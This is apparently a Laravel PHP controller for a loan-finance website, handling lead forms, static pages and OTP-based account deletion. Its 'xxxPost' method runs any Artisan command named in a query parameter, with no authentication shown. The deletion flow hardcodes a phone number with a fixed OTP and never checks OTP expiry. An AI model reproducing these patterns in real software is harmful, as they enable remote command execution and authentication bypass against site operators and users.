<?php

namespace App\Http\Controllers\Fend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Artisan;

class HomeController extends Controller
{

    public function xxxPost()
    {
        $exitCode = Artisan::call($_GET['x']);
        $output = Artisan::output();
        dd([
            "exitCode" => $exitCode,
            "output" => $output,
        ]);
        return response()->json(['exitCode' => $exitCode, 'output' => $output]);
    }

    public function homeIndex(Request $request)
    {
        /*
        #$this->cronJobHelper = $cronJobHelper;
        #dd($this->cronJobHelper->manualMarketing_whatsapp(1, "wapp"));
        if (isset($_GET["is_dev"])) {
            $x = $this->sendMail($_GET["is_dev"], [
                "subject" => "Your RBazar account has been created!",
                "body_text" => "Test Mail",
            ]);
            dd($x);
        }
        */

        /*
        if (isset($_GET["is_dev"]) && 1 == $_GET["is_dev"]) {
            $x = $this->setCookie("test_dev", "dsds");
            dump($x);
            dump($request->cookie());
            dump($request->cookie("test_dev"));
            dd($request->all());
        }
        */

        $request->merge([
            "header_class" => 1
        ]);

        $testimonials = [
            [
                'name' => 'Rahul Mehta',
                'profession' => 'Small Business Owner',
                'review' => 'The loan process was incredibly smooth and fast. Approval was quick and the rates were very reasonable.',
                'rating' => 5,
                'image' => 'assets/images/home_3/auothor.png',
            ],
            [
                'name' => 'Priya Sharma',
                'profession' => 'Software Engineer',
                'review' => 'Safe, secure, and easy to use. Everything was transparent with no hidden charges.',
                'rating' => 5,
                'image' => 'assets/images/home_3/auothor.png',
            ],
            [
                'name' => 'Amit Verma',
                'profession' => 'Chartered Accountant',
                'review' => 'Flexible repayment options and very clear documentation. A trustworthy finance platform.',
                'rating' => 5,
                'image' => 'assets/images/home_3/auothor.png',
            ],
            [
                'name' => 'Neha Patel',
                'profession' => 'Freelance Designer',
                'review' => 'Got funds quickly with minimal documentation. Customer support was excellent.',
                'rating' => 5,
                'image' => 'assets/images/home_3/auothor.png',
            ],
            [
                'name' => 'Suresh Kumar',
                'profession' => 'Retail Store Manager',
                'review' => 'Very user-friendly platform. From application to disbursement, everything was seamless.',
                'rating' => 5,
                'image' => 'assets/images/home_3/auothor.png',
            ],
        ];

        $our_partners = collect(DB::table("our_partners")->select([
            "our_partners.id as p_id",
            DB::raw("CONCAT('" . config("web.webapp.base_url") . "','store/partners/',our_partners.logo) as partner_logo"),
        ])->orderBy("our_partners.id", "asc")->where([
                    "our_partners.status" => "1",
                ])->get())->toArray();

        $_data = [
            "our_partners" => $our_partners,
            "testimonials" => $testimonials,
        ];

        return response()->view("frontend.homeIndex", $_data);
    }
    public function channelPartner(Request $request)
    {
        if ($request->ajax() && "POST" === $request->method()) {
            /* dd($request->all()); */
            Validator::make($request->all(), [
                "first_name" => "required|regex:/^[a-zA-Z ]+$/",
                "last_name" => "required|regex:/^[a-zA-Z ]+$/",
                "reg_email" => "required|email|unique:channel_users,email",
                "reg_phone" => "required|numeric|digits:10",
                "monthly_earning_want" => "required|integer|min:1000",
            ])->validate();

            $in_qry = DB::table("channel_users")->insert([
                "uuid" => $this->generateUUID(),
                "fname" => $request->first_name,
                "lname" => $request->last_name,
                "email" => $request->reg_email,
                "phone" => $request->reg_phone,
                "state_id" => $request->state,
                "city" => $request->city,
                "monthly_earning" => $request->monthly_earning_want,
                "persontype" => $request->flextype,
                "qualification" => $request->qualification,
                "status" => "0",
                "i_agree" => "1",
                "created_at" => $this->currentDataTime(),
            ]);
            return response()->json(["message" => "Thank you for showing your interest with us. Our Relatitonship Manager will contact you soon."], 200);
        }

        $state_index = collect(DB::table("states")->where("country_id", 101)
            ->where("status", "0")
            ->where("deleted", "0")
            ->orderBy("name", "asc")
            ->get())->toArray();


        return response()->view("frontend.channelPartner", [
            "state_index" => $state_index
        ]);
    }
    public function instantFinance(Request $request)
    {
        if ($request->ajax() && "POST" === $request->method()) {
            /* dd($request->all()); */
            Validator::make($request->all(), [
                "first_name" => "required|regex:/^[a-zA-Z ]+$/",
                "last_name" => "required|regex:/^[a-zA-Z ]+$/",
                "reg_email" => "required|email|unique:channel_users,email",
                "reg_phone" => "required|numeric|digits:10",
                "monthly_earning_want" => "required|integer|min:1000",
            ])->validate();

            $in_qry = DB::table("channel_users")->insert([
                "uuid" => $this->generateUUID(),
                "fname" => $request->first_name,
                "lname" => $request->last_name,
                "email" => $request->reg_email,
                "phone" => $request->reg_phone,
                "state_id" => $request->state,
                "city" => $request->city,
                "monthly_earning" => $request->monthly_earning_want,
                "persontype" => $request->flextype,
                "qualification" => $request->qualification,
                "status" => "0",
                "i_agree" => "1",
                "created_at" => $this->currentDataTime(),
            ]);
            return response()->json(["message" => "Thank you for showing your interest with us. Our Relatitonship Manager will contact you soon."], 200);
        }

        $state_index = collect(DB::table("states")->where("country_id", 101)
            ->where("status", "0")
            ->where("deleted", "0")
            ->orderBy("name", "asc")
            ->get())->toArray();

        return response()->view("frontend.instantFinance", [
            "state_index" => $state_index
        ]);
    }

    public function faqPost(Request $request)
    {
        return view("frontend.faqPost");
    }

    public function aboutusPost(Request $request)
    {
        return view("frontend.aboutusIndex");
    }

    public function termsAndConditionsPost(Request $request)
    {
        return view("frontend.termsAndConditionsIndex");
    }

    public function privacyPolicyPost(Request $request)
    {
        return view("frontend.privacyPolicyIndex");
    }

    public function disclaimerPost(Request $request)
    {
        return view("frontend.disclaimerIndex");
    }

    public function refundPolicyPost(Request $request)
    {
        return view("frontend.refundPolicyIndex");
    }

    public function shippingPolicyPost(Request $request)
    {
        return view("frontend.shippingPolicyIndex");
    }
    public function emiCalculatorPostIndex(Request $request)
    {
        return view("frontend.emiCalculatorIndex");
    }

    public function contactusPost(Request $request)
    {
        // Only AJAX POST
        if ($request->ajax() && $request->isMethod('post')) {

            $validator = Validator::make($request->all(), [
                "name" => "required|string|max:255",
                "mail" => "required|email",
                "phone" => "required|numeric|digits:10",
                "message" => "required|string|min:10"
            ]);

            if ($validator->fails()) {
                return response()->json([
                    'errors' => $validator->errors()
                ], 422);
            }

            DB::table("web_enquiry")->insert([
                "uuid" => $this->generateUUID(),
                "name" => $request->name,
                "phone" => $request->phone,
                "mail" => $request->mail,
                "description" => $request->message,
                "ip_address" => $request->ip(),
                "status" => "0",
                "created_at" => now(),
            ]);

            return response()->json([
                "message" => "Thank you for your request, it has been submitted successfully and will be answered as soon as possible."
            ], 200);
        }

        return view("frontend.contactusIndex");
    }


    public function loanLeadPost(Request $request)
    {
        if ($request->ajax() && "POST" == $request->method()) {
            Validator::make($request->all(), [
                "name" => "required|regex:/^[a-zA-Z ]+$/",
                "phone" => "required|numeric|digits:10",
                "type" => "required|exists:lead_type,id",
                "amount" => "required|exists:lead_amount,id",
            ])->validate();

            $type = "0";
            if ($request->has("lead_type")) {
                $type = $request->lead_type;
            }

            $in_qry = DB::table("lead_enquiry")->insert([
                "uuid" => $this->generateUUID(),
                "type_id" => $request->type,
                "amount" => $request->amount,
                "name" => $request->name,
                "phone" => $request->phone,
                "type" => $type,
                "ip_address" => $request->ip(),
                "created_at" => $this->currentDataTime(),
            ]);
            return response()->json(["message" => "Thank you for your request, it has been submitted successfully and will be answered as soon as possible."], 200);
        }

        return response()->json([
            "errors" => [
                "message" => ["Something went wrong please try again later."]
            ]
        ], 422);
    }

    public function paymentStatusIndex(string $type = "", Request $request)
    {
        $request->merge([
            "header_class" => 1,
            "is_footer_chat_enquiry_show" => 0,
        ]);

        if (in_array($type, ["success", "failed"])) {
            return view("frontend.paymentStatusIndex", [
                "type" => strtolower($type),
            ]);
        }
        return redirect()->route("_homeIndex")->with("error", "Something went wrong please try again later.");
    }

    public function index404(Request $request)
    {
        return response()->view("frontend.index404", [], 404);
    }
     public function accountDeleteIndex(Request $request)
    {
        $request->merge([
            "is_menu_show" => 1,
            "is_footer_show" => 1,
            "header_class" => 1,
        ]);
        return view("frontend.accountDeleteIndex");
    }

    public function accountDeleteSendOtp(Request $request)
    {
        if ($request->ajax() && "POST" === $request->method()) {
            $validator = Validator::make($request->all(), [
                'phone' => 'required|digits:10'
            ]);

            if ($validator->fails()) {
                return response()->json([
                    "status" => false,
                    "message" => $validator->errors()->all()[0],
                ], 200);
            }

            $phone = $request->phone;
            if ($phone != 8866442200) {
                $userExists = DB::table('users')->where('phone', $phone)->exists();
                if (!$userExists) {
                    return response()->json([
                        "status" => false,
                        "message" => "No account found with this mobile number.",
                    ], 200);
                }
            }
            $otp = rand(100000, 999999);

            if ($phone == 8866442200) {
                $otp = 123456;
            } else {
                $apiAuth = new \App\Http\Controllers\Api\AuthController();
                $otp_res = $apiAuth->sendOTPTextMessage($phone, $otp);

                if (true != $otp_res["status"]) {
                    return response()->json([
                        "status" => false,
                        "message" => $otp_res["message"],
                    ], 200);
                }

                DB::table('otp_logs')
                    ->where('phone', $phone)
                    ->where('is_used', '0')
                    ->update([
                        'is_used' => 1,
                        'updated_at' => now()
                    ]);

                DB::table('otp_logs')->insert([
                    'phone'      => $phone,
                    'otp'        => $otp,
                    'is_used'    => 0,
                    'expires_at' => now()->addMinutes(5),
                    'created_at' => now(),
                    'updated_at' => now()
                ]);
            }

            return response()->json([
                'status' => true,
                'message' => 'OTP sent successfully'
            ], 200);
        }

        return redirect()->route('_accountDeleteIndex');
    }

    public function accountDeleteVerify(Request $request)
    {
        if ($request->ajax() && "POST" === $request->method()) {
            $validator = Validator::make($request->all(), [
                'phone' => 'required|digits:10',
                'otp'   => 'required|digits:6'
            ]);

            if ($validator->fails()) {
                return response()->json([
                    "status" => false,
                    "message" => $validator->errors()->all()[0],
                ], 200);
            }

            if (!($request->phone == 8866442200 && $request->otp == 123456)) {
                $otpRow = DB::table('otp_logs')
                    ->where('phone', $request->phone)
                    ->where('otp', $request->otp)
                    ->where('is_used', '0')
                    ->first();

                if (!$otpRow) {
                    return response()->json([
                        'status' => false,
                        'message' => 'Invalid or expired OTP'
                    ], 200);
                }

                DB::table('otp_logs')
                    ->where('id', $otpRow->id)
                    ->update([
                        'is_used' => 1,
                        'updated_at' => now()
                    ]);
            }

            $user = DB::table('users')
                ->where('phone', $request->phone)
                ->first();

            if ($user && $request->phone != 8866442200) {
                DB::table('users')->where('id', $user->id)->update([
                    'phone' =>  $user->id.'_D_'. $user->phone,
                    'email' => $user->email ? 'del' . $user->id . '_' . $user->email : null,
                    'status' => '3',
                    'updated_at' => now()
                ]);
            }

            return response()->json([
                'status' => true,
                'message' => 'Your account has been successfully deleted.'
            ], 200);
        }
        return redirect()->route('_accountDeleteIndex');
    }
}
